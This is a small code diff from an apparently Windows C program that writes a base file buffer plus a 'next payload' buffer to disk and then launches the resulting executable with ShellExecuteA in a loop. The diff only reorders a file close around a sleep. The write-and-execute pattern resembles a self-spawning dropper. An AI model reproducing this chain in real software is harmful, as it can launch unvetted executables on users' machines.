@@ -94,10 +94,10 @@ int main(int argc, char** argv)
         }
         fwrite(myFileBuffer, 1, myStaticLength, fp);
         fwrite(nextPayloadBuf, 1, NextPayloadSize, fp);
-        fclose(fp);
-        fp = NULL;
         
         Sleep(GapTime); // Order is important here to avoid producing so fast
+        fclose(fp);
+        fp = NULL;
         ShellExecuteA(NULL, "open", nextEXEName, NULL, NULL, SW_SHOWNORMAL);
     }
 }
